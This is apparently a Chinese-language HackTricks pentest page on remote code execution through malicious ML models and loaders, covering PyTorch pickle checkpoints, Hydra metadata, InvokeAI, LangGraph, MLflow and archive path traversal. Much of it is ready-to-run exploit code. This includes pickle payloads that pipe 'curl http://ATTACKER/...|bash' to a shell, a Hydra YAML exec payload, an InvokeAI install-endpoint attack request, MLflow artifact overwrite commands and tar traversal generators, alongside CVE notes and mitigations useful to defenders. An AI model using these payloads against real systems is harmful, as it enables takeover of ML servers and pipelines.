# Models RCE

{{#include ../banners/hacktricks-training.md}}

## 加载模型实现 RCE

机器学习模型通常以不同格式共享，例如 ONNX、TensorFlow、PyTorch 等。开发人员可以将这些模型加载到自己的机器或生产系统中使用。通常模型不应包含恶意代码，但在某些情况下，模型可能会被用作在系统上执行任意代码的功能，或者由于模型加载库中的漏洞而导致任意代码执行。

下表列出了此类漏洞的典型案例：

| **框架 / 工具**        | **漏洞（如有 CVE）**                                                    | **RCE 向量**                                                                                                                           | **参考资料**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` 中的不安全反序列化* **(CVE-2025-32434)**                                                              | 恶意 pickle 嵌入模型检查点，导致代码执行（绕过 `weights_only` 防护）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 恶意模型下载导致代码执行；管理 API 中的 Java 反序列化 RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | 通过 `torch.load` 进行不安全的检查点反序列化 **(CVE-2025-23298)**                                           | 不可信检查点在 `load_model_trainer_states_from_checkpoint` 期间触发 pickle reducer → 在 ML worker 中执行代码            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + 不安全的 MessagePack 扩展钩子 **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | 用户可控的 `filter` 键注入 SQL/JSON-path 语法，`UNION SELECT` 伪造虚假检查点行，随后 `msgpack` 反序列化会导入并调用攻击者指定的 Python 代码 | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678**（不安全的 YAML）<br> **CVE-2024-3660**（Keras Lambda）                                                      | 从 YAML 加载模型时会使用 `yaml.unsafe_load`（执行代码）<br>加载带有 **Lambda** 层的模型会运行任意 Python 代码          | |
| TensorFlow (TFLite)         | **CVE-2022-23559**（TFLite 解析）                                                                                          | 特制的 `.tflite` 模型触发整数溢出 → 堆损坏（可能导致 RCE）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092**（joblib/pickle）                                                                                           | 通过 `joblib.load` 加载模型时，会执行带有攻击者 `__reduce__` payload 的 pickle                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446**（不安全的 `np.load`）*有争议*                                                                              | `numpy.load` 默认允许 pickle 对象数组——恶意 `.npy/.npz` 会触发代码执行                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882**（目录遍历）<br> **CVE-2024-5187**（tar 遍历）                                                    | ONNX 模型的外部权重路径可逃逸出目录（读取任意文件）<br>恶意 ONNX 模型 tar 可覆盖任意文件（导致 RCE） | |
| ONNX Runtime (design risk)  | *（无 CVE）* ONNX 自定义 ops / 控制流                                                                                    | 带有自定义算子的模型需要加载攻击者的原生代码；复杂的模型图可滥用逻辑来执行非预期计算   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036**（路径遍历）                                                                                          | 启用 `--model-control` 时，使用模型加载 API 可通过相对路径遍历写入文件（例如，覆盖 `.bashrc` 以实现 RCE）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668**（多个堆溢出）                                                                         | 格式错误的 GGUF 模型文件会导致解析器发生堆缓冲区溢出，从而能在受害系统上执行任意代码                     | |
| **Keras (older formats)**   | *（无新 CVE）* 旧版 Keras H5 模型                                                                                         | 带有 Lambda 层的恶意 HDF5（`.h5`）模型仍会在加载时执行代码（Keras safe_mode 不涵盖旧格式——“降级攻击”） | |
| **Others** (general)        | *设计缺陷* – Pickle 序列化                                                                                         | 许多 ML 工具（例如，基于 pickle 的模型格式、Python `pickle.load`）都会执行嵌入模型文件中的任意代码，除非采取缓解措施 | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 将不可信元数据传递给 `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻击者控制的模型元数据/配置将 `_target_` 设为任意可调用对象（例如 `builtins.exec`）→ 在加载期间执行，即使使用“安全”格式（`.safetensors`、`.nemo`、仓库 `config.json`）也不例外 | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

此外，还有一些基于 Python pickle 的模型，例如 [PyTorch](https://github.com/pytorch/pytorch/security) 使用的模型，如果没有使用 `weights_only=True` 加载，就可能被用于在系统上执行任意代码。因此，任何基于 pickle 的模型都可能特别容易受到此类攻击，即使它们没有列在上表中。

### Hydra 元数据 → RCE（即使使用 safetensors 也有效）

`hydra.utils.instantiate()` 会导入并调用配置/元数据对象中的任意带点号的 `_target_`。当 Hugging Face Transformers 等库将**不可信模型元数据**传入 `instantiate()` 时，攻击者可以提供可调用对象及其参数，在模型加载期间立即运行（无需 pickle）。<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

payload 示例（适用于 `.nemo` 的 `model_config.yaml`、仓库 `config.json`，或 `.safetensors` 中的 `__metadata__`）：

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

要点：
- 在 NeMo `restore_from/from_pretrained`、uni2TS HuggingFace coders 和 FlexTok loaders 中，模型初始化前触发。
- Hydra 的字符串 block-list 可通过替代导入路径（例如 `enum.bltns.eval`）或应用程序解析出的名称（例如 `nemo.core.classes.common.os.system` → `posix`）绕过。<sup>[[14]](#references)</sup>
- FlexTok 还会使用 `ast.literal_eval` 解析字符串化的元数据，在调用 Hydra 前就可能导致 DoS（CPU/内存暴涨）。

### 🆕  InvokeAI 通过 `torch.load` 实现 RCE（CVE-2024-12029）

`InvokeAI` 是一款流行的开源 Stable-Diffusion Web 界面。**5.3.1 – 5.4.2** 版本暴露了 REST endpoint `/api/v2/models/install`，允许用户从任意 URL 下载并加载模型。<sup>[[1]](#references)</sup>

该 endpoint 最终会调用：

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

当提供的文件是 **PyTorch checkpoint (`*.ckpt`)** 时，`torch.load` 会执行 **pickle 反序列化**。由于内容直接来自用户控制的 URL，攻击者可以在 checkpoint 中嵌入带有自定义 `__reduce__` 方法的恶意对象；该方法会在**反序列化期间**执行，导致 InvokeAI 服务器上发生**远程代码执行 (RCE)**。

此漏洞被分配了 **CVE-2024-12029**（CVSS 9.8，EPSS 61.17 %）。

#### Exploitation walk-through

1. 创建一个恶意 checkpoint：

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. 将 `payload.ckpt` 托管在你控制的 HTTP 服务器上（例如 `http://ATTACKER/payload.ckpt`）。
3. 触发存在漏洞的端点（无需身份验证）：

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI 下载文件时会调用 `torch.load()` → `os.system` gadget 会运行，攻击者便可在 InvokeAI 进程的上下文中执行代码。

现成的 exploit：**Metasploit** 模块 `exploit/linux/http/invokeai_rce_cve_2024_12029` 可自动完成整个流程。<sup>[[3]](#references)</sup>

#### 条件

•  InvokeAI 5.3.1-5.4.2（scan flag 默认值为 **false**）
•  攻击者可访问 `/api/v2/models/install`
•  进程拥有执行 shell 命令的权限

#### 缓解措施

* 升级到 **InvokeAI ≥ 5.4.3** – 补丁默认将 `scan=True`，并在反序列化前执行 malware 扫描。<sup>[[2]](#references)</sup>
* 以编程方式加载 checkpoint 时，使用 `torch.load(file, weights_only=True)` 或新的 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper。
* 对模型来源和服务运行环境实施 allow-list / 签名验证，并以最小权限运行服务。

> ⚠️ 请记住，**任何**基于 Python pickle 的格式（包括许多 `.pt`、`.pkl`、`.ckpt`、`.pth` 文件）从不可信来源反序列化时都存在固有风险。

---

如果必须让旧版本的 InvokeAI 继续在反向代理后运行，以下是一个临时缓解措施示例：

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec 通过不安全的 `torch.load` 实现 RCE (CVE-2025-23298)

NVIDIA 的 Transformers4Rec（Merlin 的一部分）暴露了一个不安全的 checkpoint 加载器，它会直接对用户提供的路径调用 `torch.load()`。由于 `torch.load` 依赖 Python `pickle`，攻击者控制的 checkpoint 可在反序列化期间通过 reducer 执行任意代码。<sup>[[5]](#references)</sup>

易受攻击的路径（修复前）：`transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

为何会导致 RCE：在 Python pickle 中，对象可以定义一个 reducer（`__reduce__`/`__setstate__`），返回一个可调用对象及其参数。该可调用对象会在 unpickling 期间执行。如果 checkpoint 中包含此类对象，它就会在使用任何权重之前运行。

最精简的恶意 checkpoint 示例：

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

投递途径和影响范围：
- 通过 repos、buckets 或 artifact registries 共享的木马化 checkpoints/models
- 会自动加载 checkpoints 的自动化 resume/deploy pipelines
- 在 training/inference workers 中执行，且通常具有较高权限（例如容器中的 root）

修复：Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）将直接调用 `torch.load()` 替换为受限的 allowlist deserializer，实现在 `transformers4rec/utils/serialization.py` 中。新的 loader 会验证类型和字段，并阻止在加载期间调用任意 callable。<sup>[[7]](#references)</sup>

PyTorch checkpoints 的具体防御建议：
- 不要反序列化不可信数据。尽可能优先使用 [Safetensors](https://huggingface.co/docs/safetensors/index) 或 ONNX 等非可执行格式。
- 如果必须使用 PyTorch serialization，请确保设置 `weights_only=True`（较新版本的 PyTorch 支持），或使用类似 Transformers4Rec 补丁的自定义 allowlist unpickler。<sup>[[4]](#references)</sup>
- 强制验证 model 来源和签名，并对反序列化过程进行 sandbox 隔离（seccomp/AppArmor；使用非 root 用户；限制 FS 且禁止网络出口）。
- 在加载 checkpoint 时，监控 ML 服务是否启动了意外的子进程；追踪 `torch.load()`/`pickle` 的使用情况。

POC 和漏洞/补丁参考：<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- 补丁前的易受攻击 loader：https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- 恶意 checkpoint POC：https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- 补丁后的 loader：https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## 示例 – 构造恶意 PyTorch 模型

- 创建模型：

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- 加载模型：

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Tencent FaceDetection-DSFD resnet 反序列化 (CVE-2025-13715 / ZDI-25-1183)

Tencent 的 FaceDetection-DSFD 暴露了一个 `resnet` endpoint，会反序列化由用户控制的数据。ZDI 确认，远程攻击者可以诱使受害者加载恶意页面/文件，使其向该 endpoint 发送精心构造的序列化数据块，并以 `root` 身份触发反序列化，从而导致系统完全沦陷。

该利用流程与典型的 pickle 滥用类似：

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

在反序列化期间可触达的任何 gadget（构造函数、`__setstate__`、框架回调等）都可以用同样的方式武器化，无论传输方式是 HTTP、WebSocket，还是放入受监控目录的文件。



### LangGraph checkpointer SQLi → MessagePack RCE

这条攻击链很有意思，因为攻击者**不需要上传恶意模型文件**。相反，应用暴露了一个 **AI-agent 持久化 API**（`get_state_history(..., filter=...)`），而用户输入会传入 checkpointer 查询构造器。

#### 1. 元数据过滤器中的结构型 SQLi

一种存在漏洞的 SQLite 模式如下：

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

值稍后才会绑定，但 `query_key` 被拼接进 **JSON path 字符串**，因此字典键中的 `'` 会跳出 `'$.{query_key}'` 并注入 SQL。同样的教训也适用于 **JSON paths、identifiers、operators、`LIMIT` 和 TTL fields**：占位符只能保护值，不能保护查询结构语法。

#### 2. `UNION SELECT` 可以针对下游 sinks，而不只是窃取数据

查询返回 `type` 和序列化的 `checkpoint` 字节，之后会作为以下内容被使用：

```python
self.serde.loads_typed((type, checkpoint))
```

这意味着 `WHERE` 子句中的 SQLi 可以注入一条**伪造的结果行**：

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

如果后续代码会解析、反序列化、写入或执行任何选定列的内容，请将这些列映射到对应的 sink。在本例中，伪造行会将 SQLi 转变为**攻击者可控的反序列化**。

#### 3. 不安全的 MessagePack 扩展钩子等同于代码 gadget

LangGraph 的 `msgpack` 路径使用了自定义扩展钩子，用于解包嵌套元组并执行：

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

因此，一个编码了等价于 `("os", "system", "id > /tmp/pwned")` 的 MessagePack 扩展对象会导入 `os`，解析 `system`，并执行该命令。审查 AI 框架时，应检查**自定义 MessagePack/JSON/pickle reviver**是否存在动态导入、反射或任意 callable 分发。

#### 4. Agent 框架的实用审计模式

审查所有可能接收用户可控输入的接口，包括：
- state history / memory / replay / checkpoint listing API
- 生成 SQL 或 Redis 查询片段的结构化过滤器构造器
- 自定义反序列化器（`pickle`、`msgpack`、`json` object hook、YAML constructor）
- 信任持久化层返回行的恢复路径

当不可信用户可以控制 `filter` 时，此特定攻击链会影响使用 **SQLite** 或 **Redis** checkpointer 的自托管 LangGraph 部署。披露中列出的已修复版本为 `langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+` 和 `langgraph-checkpoint 4.0.1+`。<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact 覆写导致 pickle RCE

从 `PythonModel` 创建的 MLflow PyFunc 可以将序列化对象存储为 `python_model.pkl`。模型元数据将 `mlflow.pyfunc.model` 指定为其 loader，而 MLflow 的实现会使用此文件名保存 Python model。因此，对 artifact store 的写入权限可能导致代码执行：另一个应用稍后加载该 model 时就会触发执行。<sup>[[17]](#references)[[18]](#references)</sup>

有效的攻击链是**artifact 写入权限 → 替换 pickle → 让推理使用方重新加载它**。对于使用代理 `mlflow-artifacts:/...` 根路径的实验，应枚举 experiment、run 和 model 的 artifact 路径。Tracking server 在 `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` 上提供 `GET` 和 `PUT` 接口。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

最简化的 reducer 可以在使用方反序列化该制品时立即执行命令。使用 `MLmodel` 中声明的 Python 版本生成 payload，可避免兼容性问题。<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

触发会**加载现有模型**的操作，例如预测、评分或部署。不要先重新训练，因为训练可能会用新的模型替换恶意 artifact。应用程序报错并不能证明利用失败：reducer 返回的是命令的整数退出状态，而不是可用的模型。先使用可观察的副作用，例如 ICMP 或 HTTP 回连，然后再替换为最终 payload。<sup>[[20]](#references)</sup>

评估期间，应区分创建 run 的权限与覆盖属于其他 run 的 artifact 的权限。检查身份验证和每个 run 的更新权限，检查 `python_model.pkl` 是否有意外修改，并将模型来源和完整性视为执行边界的一部分。当前 MLflow 代码还支持设置 `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false`，并建议使用 models-from-code artifact，而不是加载 cloudpickle 数据。<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### 暴露的模型服务器和 ML 基础设施

加载恶意模型并不是在 ML 基础设施上运行代码的唯一方式。作业提交 API、代码验证端点以及自托管 AI 服务的模型 registry 拉取操作，都可能导致代码执行，即使没有任何模型文件也不例外。请参阅[暴露的自托管 AI 服务](AI-Exposed-Self-Hosted-AI-Services.md)。

## 模型到路径遍历

正如[**这篇博客文章**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)中所述，不同 AI 框架使用的大多数模型格式都基于归档文件，通常是 `.zip`。因此，可能可以利用这些格式发起路径遍历攻击，从加载模型的系统中读取任意文件。<sup>[[16]](#references)</sup>

例如，使用以下代码可以创建一个模型，在加载时于 `/tmp` 目录中创建文件：

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

或者，使用以下代码可以创建一个模型，该模型在加载时会创建指向 `/tmp` 目录的符号链接：

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### 深入探究：Keras .keras 反序列化与 gadget hunting

如需深入了解 .keras 内部机制、Lambda-layer RCE、≤ 3.8 中的任意导入问题，以及修复后在 allowlist 内发现 gadget 的方法，请参阅：


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – “CVE-2024-12029 – InvokeAI 不可信数据反序列化”](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI 补丁提交 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit 模块文档](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load 安全注意事项](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298：在 NVIDIA Merlin 中实现远程代码执行](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI 公告：ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec 补丁提交 b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [修复前的易受攻击加载器 (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [恶意 checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [修复后的加载器 (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 使用现代 AI/ML 格式和库实现远程代码执行](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate 文档](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list 提交（RCE 警告）](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – 从 SQLi 到 RCE：利用 LangGraph 的 Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [将 Archive Slip 漏洞转化为高价值 AI/ML 漏洞赏金机会](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk 公告和 PyFunc 概念验证 – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow 源码 – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact 下载和上传端点](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
